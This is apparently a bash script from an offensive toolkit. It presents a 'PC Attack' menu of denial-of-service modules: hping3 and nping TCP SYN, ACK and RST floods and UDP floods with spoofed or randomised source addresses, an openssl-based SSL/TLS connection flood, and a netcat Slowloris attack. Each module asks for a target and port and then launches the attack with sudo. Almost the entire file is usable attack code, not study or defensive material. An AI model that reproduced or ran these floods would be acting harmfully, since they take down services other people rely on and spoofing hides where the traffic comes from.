#!/bin/bash
#user=`id | cut -d" " -f1 | cut -d"(" -f2 | cut -d")" -f1`

##set the prompt to show you are in pentmenu and not standard shell
PS3="PC Attack>"


###Web Application
##Sub Menu
submenu(){
clear
echo ""
figlet -c PC Attack
echo "===================================== PC Attack =====================================" 
submenu=("Denial Of Service" "Back" "Quit")
select opt in "${submenu[@]}"
do
	if [ "$opt" = "Back" ]
	then
		clear
		bash michaCry.sh
	elif [ "$opt" = "Quit" ]
	then
		clear
		figlet -c Thank You ! ! !
		exit 0
	elif [ "$opt" = "Denial Of Service" ]
	then
		dosmenu
	fi
done
}

##DOS
dosmenu()
{
clear
figlet -c DDOS
echo "===================================== DENIAL OF SERVICE =====================================" 
#display a menu for the DOS module using bash select
		dosmenu=("TCP SYN Flood" "TCP ACK Flood" "TCP RST Flood" "UDP Flood" "SSL DOS" "Slowloris" "Back")
	select dosopt in "${dosmenu[@]}"; do
#TCP SYN Flood DOS
 	if [ "$dosopt" = "TCP SYN Flood" ]; then
		synflood
#TCP ACK Flood
	elif [ "$dosopt" = "TCP ACK Flood" ]; then
		ackflood
#TCP RST Flood
	elif [ "$dosopt" = "TCP RST Flood" ]; then
		rstflood
#UDP Flood		
 	elif [ "$dosopt" = "UDP Flood" ]; then
		udpflood
#SSL DOS
	elif [ "$dosopt" = "SSL DOS" ]; then
		ssldos
#Slowloris
	elif [ "$dosopt" = "Slowloris" ]; then
		slowloris
#Go back	
	elif [ "$dosopt" = "Go back" ]; then
		submenu
	fi
	done
}



##TCPSYNFLOOD
synflood()
{		echo "TCP SYN Flood uses hping3...checking for hping3..."
	if test -f "/usr/sbin/hping3"; then echo "hping3 found, continuing!";
#hping3 is found, so use that for TCP SYN Flood
		echo -e "Enter target: \c"
#need a target IP/hostname
	read -i $TARGET -e TARGET
#need a port to send TCP SYN packets to
		echo -e "Enter target port: \c"
	read -i $PORT -e PORT
#What source address to use? Manually defined, or random, or outgoing interface IP?
		echo -e "Enter Source IP, or [r]andom or [i]nterface IP (default): \c"
	read -i $SOURCE -e SOURCE
	: ${SOURCE:=i}
#shoud any data be sent with the SYN packet?  Default is to send no data
	echo -e "Send data with SYN packet[y]es or [n]o (default): \c"
	read -i $SENDDATA -e SENDDATA
	: ${SENDDATA:=n}
	if [[ $SENDDATA = y ]]; then
#we've chosen to send data, so how much should we send?  
	echo -e "Enter number of data bytes to send (default 3000): \c"
	read -i $DATA -e DATA
	: ${DATA:=3000}
#If not an integer is entered, use default
	if ! [[ "$DATA" =~ ^[0-9]+$ ]]; then
	DATA=3000 && echo "Invalid integer!  Using data length of 3000 bytes"
	fi
#if $SENDDATA is not equal to y (yes) then send no data
	else DATA=0 
	fi
#start TCP SYN flood using values defined earlier
#note that virtual fragmentation is set.  The default for hping3 is 16 bytes.
#fragmentation should therefore place more stress on the target system
	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
		echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --frag --spoof $SOURCE -p $PORT -S $TARGET
	elif [ "$SOURCE" = "r" ]; then
		echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --frag --rand-source -p $PORT -S $TARGET
	elif [ "$SOURCE" = "i" ]; then
		echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -d $DATA --flood --frag -p $PORT -S $TARGET
	else echo "Not a valid option!  Using interface IP"
		echo "Starting TCP SYN Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --frag -p $PORT -S $TARGET
	fi
#No hping3 so using nping for TCP SYN Flood
	else echo "hping3 not found :( trying nping instead"
		echo ""
		echo "Trying TCP SYN Flood with nping..this will work but is not ideal"
#need a valid target ip/hostname
		echo -e "Enter target: \c"
	read -i $TARGET -e TARGET
#need a valid target port
		echo -e "Enter target port: \c"
	read -i $PORT -e PORT
#define source IP or use outgoing interface IP
		echo -e "Enter Source IP or use [i]nterface IP (default): \c"
	read -i $SOURCE -e SOURCE
		: ${SOURCE:=i}
#How many packets to send per second?  default is 10k
		echo -e "Enter number of packets to send per second (default is 10,000): \c"
	read RATE
		: ${RATE:=10000}
#how many packets in total to send?
#default is 100k, so using default values will send 10k packets per second for 10 seconds
		echo -e "Enter total number of packets to send (default is 100,000): \c"
	read TOTAL
		: ${TOTAL:=100000}
		echo "Starting TCP SYN Flood..."
#begin TCP SYN flood using values defined earlier
	if 	[ "$SOURCE" = "i" ]; then
		sudo nping --tcp --dest-port $PORT --flags syn --rate $RATE -c $TOTAL -v-1 $TARGET
	else sudo nping --tcp --dest-port $PORT --flags syn --rate $RATE -c $TOTAL -v-1 -S $SOURCE $TARGET
	fi
	fi
}


##TCPACKFLOOD
ackflood()
{		echo "TCP ACK Flood uses hping3...checking for hping3..."
	if test -f "/usr/sbin/hping3"; then echo "hping3 found, continuing!";
#hping3 is found, so use that for TCP ACK Flood
		echo -e "Enter target: \c"
#need a target IP/hostname
	read -i $TARGET -e TARGET
#need a port to send TCP ACK packets to
		echo -e "Enter target port: \c"
	read -i $PORT -e PORT
#What source address to use? Manually defined, or random, or outgoing interface IP?
		echo -e "Enter Source IP, or [r]andom or [i]nterface IP (default): \c"
	read -i $SOURCE -e SOURCE
	: ${SOURCE:=i}
#shoud any data be sent with the ACK packet?  Default is to send no data
	echo -e "Send data with ACK packet? [y]es or [n]o (default): \c"
	read -i $SENDDATA -e SENDDATA
	: ${SENDDATA:=n}
	if [[ $SENDDATA = y ]]; then
#we've chosen to send data, so how much should we send?  
	echo -e "Enter number of data bytes to send (default 3000): \c"
	read -i $DATA -e DATA
	: ${DATA:=3000}
#If not an integer is entered, use default
	if ! [[ "$DATA" =~ ^[0-9]+$ ]]; then
	DATA=3000 && echo "Invalid integer!  Using data length of 3000 bytes"
	fi
#if $SENDDATA is not equal to y (yes) then send no data
	else DATA=0 
	fi
#start TCP ACK flood using values defined earlier
#note that virtual fragmentation is set.  The default for hping3 is 16 bytes.
#fragmentation should therefore place more stress on the target system
	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
		echo "Starting TCP ACK Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --frag --spoof $SOURCE -p $PORT -A $TARGET
	elif [ "$SOURCE" = "r" ]; then
		echo "Starting TCP ACK Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --frag --rand-source -p $PORT -A $TARGET
	elif [ "$SOURCE" = "i" ]; then
		echo "Starting TCP ACK Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -d $DATA --flood --frag -p $PORT -A $TARGET
	else echo "Not a valid option!  Using interface IP"
		echo "Starting TCP ACK Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --frag -p $PORT -A $TARGET
	fi
#No hping3 so using nping for TCP ACK Flood
	else echo "hping3 not found :( trying nping instead"
		echo ""
		echo "Trying TCP ACK Flood with nping..this will work but is not ideal"
#need a valid target ip/hostname
		echo -e "Enter target: \c"
	read -i $TARGET -e TARGET
#need a valid target port
		echo -e "Enter target port: \c"
	read -i $PORT -e PORT
#define source IP or use outgoing interface IP
		echo -e "Enter Source IP or use [i]nterface IP (default): \c"
	read -i $SOURCE -e SOURCE
		: ${SOURCE:=i}
#How many packets to send per second?  default is 10k
		echo -e "Enter number of packets to send per second (default is 10,000): \c"
	read RATE
		: ${RATE:=10000}
#how many packets in total to send?
#default is 100k, so using default values will send 10k packets per second for 10 seconds
		echo -e "Enter total number of packets to send (default is 100,000): \c"
	read TOTAL
		: ${TOTAL:=100000}
		echo "Starting TCP ACK Flood..."
#begin TCP ACK flood using values defined earlier
	if 	[ "$SOURCE" = "i" ]; then
		sudo nping --tcp --dest-port $PORT --flags ack --rate $RATE -c $TOTAL -v-1 $TARGET
	else sudo nping --tcp --dest-port $PORT --flags ack --rate $RATE -c $TOTAL -v-1 -S $SOURCE $TARGET
	fi
	fi
}



##TCPRSTFLOOD
rstflood()
{		echo "TCP RST Flood uses hping3...checking for hping3..."
	if test -f "/usr/sbin/hping3"; then echo "hping3 found, continuing!";
#hping3 is found, so use that for TCP RST Flood
		echo -e "Enter target: \c"
#need a target IP/hostname
	read -i $TARGET -e TARGET
#need a port to send TCP RST packets to
		echo -e "Enter target port: \c"
	read -i $PORT -e PORT
#What source address to use? Manually defined, or random, or outgoing interface IP?
		echo -e "Enter Source IP, or [r]andom or [i]nterface IP (default): \c"
	read -i $SOURCE -e SOURCE
	: ${SOURCE:=i}
#shoud any data be sent with the RST packet?  Default is to send no data
	echo "Send data with RST packet? [y]es or [n]o (default)"
	read -i $SENDDATA -e SENDDATA
	: ${SENDDATA:=n}
	if [[ $SENDDATA = y ]]; then
#we've chosen to send data, so how much should we send?  
	echo -e "Enter number of data bytes to send (default 3000): \c"
	read -i $DATA -e DATA
	: ${DATA:=3000}
#If not an integer is entered, use default
	if ! [[ "$DATA" =~ ^[0-9]+$ ]]; then
	DATA=3000 && echo "Invalid integer!  Using data length of 3000 bytes"
	fi
#if $SENDDATA is not equal to y (yes) then send no data
	else DATA=0 
	fi
#start TCP RST flood using values defined earlier
#note that virtual fragmentation is set.  The default for hping3 is 16 bytes.
#fragmentation should therefore place more stress on the target system
	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
		echo "Starting TCP RST Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --frag --spoof $SOURCE -p $PORT -R $TARGET
	elif [ "$SOURCE" = "r" ]; then
		echo "Starting TCP RST Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --frag --rand-source -p $PORT -R $TARGET
	elif [ "$SOURCE" = "i" ]; then
		echo "Starting TCP RST Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 -d $DATA --flood --frag -p $PORT -R $TARGET
	else echo "Not a valid option!  Using interface IP"
		echo "Starting TCP RST Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood -d $DATA --frag -p $PORT -R $TARGET
	fi
#No hping3 so using nping for TCP RST Flood
	else echo "hping3 not found :( trying nping instead"
		echo ""
		echo "Trying TCP RST Flood with nping..this will work but is not ideal"
#need a valid target ip/hostname
		echo -e "Enter target: \c"
	read -i $TARGET -e TARGET
#need a valid target port
		echo -e "Enter target port: \c"
	read -i $PORT -e PORT
#define source IP or use outgoing interface IP
		echo -e "Enter Source IP or use [i]nterface IP (default): \c"
	read -i $SOURCE -e SOURCE
		: ${SOURCE:=i}
#How many packets to send per second?  default is 10k
		echo -e "Enter number of packets to send per second (default is 10,000): \c"
	read RATE
		: ${RATE:=10000}
#how many packets in total to send?
#default is 100k, so using default values will send 10k packets per second for 10 seconds
		echo -e "Enter total number of packets to send (default is 100,000): \c"
	read TOTAL
		: ${TOTAL:=100000}
		echo "Starting TCP RST Flood..."
#begin TCP RST flood using values defined earlier
	if 	[ "$SOURCE" = "i" ]; then
		sudo nping --tcp --dest-port $PORT --flags rst --rate $RATE -c $TOTAL -v-1 $TARGET
	else sudo nping --tcp --dest-port $PORT --flags rst --rate $RATE -c $TOTAL -v-1 -S $SOURCE $TARGET
	fi
	fi
}



##UDPFLOOD
udpflood()
{ echo "UDP Flood uses hping3...checking for hping3..."
#check for hping on the local system
if test -f "/usr/sbin/hping3"; then echo "hping3 found, continuing!";
#hping3 is found, so use that for UDP Flood
#need a valid target IP/hostname
	echo -e "Enter target: \c"
		read -i $TARGET -e TARGET
#need a valid target UDP port
	echo -e "Enter target port: \c"
		read -i $PORT -e PORT
#what data should we send with each packet?
#curently only accepts stdin.  Can't define a file to read from
	echo -e "Enter random string (data to send): \c"
		read DATA
#what source IP should we write to sent packets?
	echo -e "Enter Source IP, or [r]andom or [i]nterface IP (default): \c"
		read -i $SOURCE -e SOURCE
	: ${SOURCE:=i}
#start the attack using values defined earlier
	if [[ "$SOURCE" =~ ^([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})[.]([0-9]{1,3})$ ]]; then
		echo "Starting UDP Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood --spoof $SOURCE --udp --sign $DATA -p $PORT $TARGET
	elif [ "$SOURCE" = "r" ]; then
		echo "Starting UDP Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood --rand-source --udp --sign $DATA -p $PORT $TARGET
	elif [ "$SOURCE" = "i" ]; then
		echo "Starting UDP Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood --udp --sign $DATA -p $PORT $TARGET
#if no valid source option is selected, use outgoing interface IP
	else echo "Not a valid option!  Using interface IP"
		echo "Starting UDP Flood. Use 'Ctrl c' to end and return to menu"
		sudo hping3 --flood --udp --sign $DATA -p $PORT $TARGET
	fi
#If no hping3, use nping for UDP Flood instead.  Not ideal but it will work.
	else echo "hping3 not found :( trying nping instead"
		echo ""
		echo "Trying UDP Flood with nping.."
		echo -e "Enter target: \c"
#need a valid target IP/hostname
	read -i $TARGET -e TARGET
		echo -e "Enter target port: \c"
#need a port to send UDP packets to
	read -i $PORT -e PORT
#what source address should we use in sent packets?
		echo -e "Enter Source IP or use [i]nterface IP (default): \c"
	read -i $SOURCE -e SOURCE
		: ${SOURCE:=i}
#how many packets should we try to send each second?
		echo -e "Enter number of packets to send per second (default is 10,000): \c"
	read RATE
		: ${RATE:=10000}
#how many packets should we send in total?
		echo -e "Enter total number of packets to send (default is 100,000): \c"
	read TOTAL
		: ${TOTAL:=100000}
#default values will send 10k packets each second, for 10 seconds
#what data should we send with each packet?
#curently only accepts stdin.  Can't define a file to read from
		echo -e "Enter string to send (data):"
	read DATA	
		echo "Starting UDP Flood..."
#start the UDP flood using values we defined earlier
	if 	[ "$SOURCE" = "i" ]; then
		sudo nping --udp --dest-port $PORT --data-string $DATA --rate $RATE -c $TOTAL -v-1 $TARGET
	else sudo nping --udp --dest-port $PORT --data-string $DATA --rate $RATE -c $TOTAL -v-1 -S $SOURCE $TARGET
	fi
fi
}


##SSLDOS
ssldos() 
{ echo "Using openssl for SSL/TLS DOS"
		echo -e "Enter target: \c"
#need a target IP/hostname
	read -i $TARGET -e TARGET
#need a target port
		echo -e "Enter target port (defaults to 443): \c"
read -i $PORT -e PORT
: ${PORT:=443}
#check a valid target port is entered otherwise assume port 443 
if  ! [[ "$PORT" =~ ^[0-9]+$ ]]; then 
	PORT=443 && echo "You provided a string, not a port number!  Reverting to port 443"
fi
if [ "$PORT" -lt "1" ]; then
	PORT=443 && echo "Invalid port number chosen!  Reverting to port 443"
elif [ "$PORT" -gt "65535" ]; then
	PORT=443 && echo "Invalid port number chosen!  Reverting to port 443"
else echo "Using port $PORT"
fi
#do we want to use client renegotiation?
	echo -e "Use client renegotiation? [y]es or [n]o (default): \c"
read NEGOTIATE
: ${NEGOTIATE:=n}
if [[ $NEGOTIATE = y ]]; then
#if client renegotiation is selected for use, launch the attack supporting it
	echo "Starting SSL DOS attack...Use 'Ctrl c' to quit" && sleep 1	
while : for i in {1..10} 
	do echo "spawning instance, attempting client renegotiation"; echo "R" | openssl s_client -connect $TARGET:$PORT 2>/dev/null 1>/dev/null & 
done
elif [[ $NEGOTIATE = n ]]; then
#if client renegotiation is not requested, lauch the attack without support for it
	echo "Starting SSL DOS attack...Use 'Ctrl c' to quit" && sleep 1	
while : for i in {1..10} 
	do echo "spawning instance"; openssl s_client -connect $TARGET:$PORT 2>/dev/null 1>/dev/null & 
done
#if an invalid option is chosen for client renegotiation, launch the attack without it
else 
	echo "Invalid option, assuming no client renegotiation"
	echo "Starting SSL DOS attack...Use 'Ctrl c' to quit" && sleep 1	
while : for i in {1..10} 
	do echo "spawning instance"; openssl s_client -connect $TARGET:$PORT 2>/dev/null 1>/dev/null & 
done
fi
#The SSL/TLS DOS code is crude but it can be brutally effective
}



slowloris()
{ echo "Using netcat for Slowloris attack...." && sleep 1
echo -e "Enter target: \c"
#need a target IP or hostname
	read -i $TARGET -e TARGET
echo "Target is set to $TARGET"
#need a target port
echo -e "Enter target port (defaults to 80): \c"
	read -i $PORT -e PORT
	: ${PORT:=80}
#check a valid integer is given for the port, anything else is invalid
	if ! [[ "$PORT" =~ ^[0-9]+$ ]]; then
PORT=80 && echo "Invalid port, reverting to port 80"
	elif [ "$PORT" -lt "1" ]; then
PORT=80 && echo "Invalid port number chosen! Reverting port 80"
	elif [ "$PORT" -gt "65535" ]; then
PORT=80 && echo "Invalid port chosen! Reverting to port 80"
	else echo "Using Port $PORT"
	fi
#how many conenctions should we attempt to open with the target?
#there is no hard limit, it depends on available resources.  Default is 2000 simultaneous connections
echo "Enter number of connections to open (default 2000):"
		read CONNS
	: ${CONNS:=2000}
#ensure a valid integer is entered
	if ! [[ "$CONNS" =~ ^[0-9]+$ ]]; then
CONNS=2000 && echo "Invalid integer!  Using 2000 connections"
	fi
#how long do we wait between sending header lines?
#too long and the connection will likely be closed
#too short and our connections have little/no effect on server
#either too long or too short is bad.  Default random interval is a sane choice
echo "Choose interval between sending headers."
echo "Default is [r]andom, between 5 and 15 seconds, or enter interval in seconds:"
	read INTERVAL
	: ${INTERVAL:=r}
	if [[ "$INTERVAL" = "r" ]]
then
#if default (random) interval is chosen, generate a random value between 5 and 15
#note that this module uses $RANDOM to generate random numbers, it is sufficient for our needs
INTERVAL=$((RANDOM % 11 + 5))
#check that r (random) or a valid number is entered 
	elif ! [[ "$INTERVAL" =~ ^[0-9]+$ ]] && ! [[ "$INTERVAL" = "r" ]]
then
#if not r (random) or valid number is chosen for interval, assume r (random)
INTERVAL=$((RANDOM % 11 + 5)) && echo "Invalid integer!  Using random value between 5 and 15 seconds"
	fi
#run stunnel_client function
stunnel_client
if [[ "$SSL" = "y" ]]
then 
#if SSL is chosen, set the attack to go through local stunnel listener
echo "Launching Slowloris....Use 'Ctrl c' to exit prematurely" && sleep 1
	i=1
	while [ "$i" -le "$CONNS" ]; do
echo "Slowloris attack ongoing...this is connection $i, interval is $INTERVAL seconds"; echo -e "GET / HTTP/1.1\r\nHost: $TARGET\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n$RANDOM: $RANDOM\r\n"|nc -i $INTERVAL -w 30000 $LHOST $LPORT  2>/dev/null 1>/dev/null & i=$((i + 1)); done
echo "Opened $CONNS connections....returning to menu"
else 
#if SSL is not chosen, launch the attack on the server without using a local listener
echo "Launching Slowloris....Use 'Ctrl c' to exit prematurely" && sleep 1
	i=1
	while [ "$i" -le "$CONNS" ]; do
echo "Slowloris attack ongoing...this is connection $i, interval is $INTERVAL seconds"; echo -e "GET / HTTP/1.1\r\nHost: $TARGET\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nDNT: 1\r\nConnection: keep-alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n$RANDOM: $RANDOM\r\n"|nc -i $INTERVAL -w 30000 $TARGET $PORT  2>/dev/null 1>/dev/null & i=$((i + 1)); done
#return to menu once requested number of connections has been opened or resources are exhausted
echo "Opened $CONNS connections....returning to menu"
fi
}


##Deploy Script
submenu


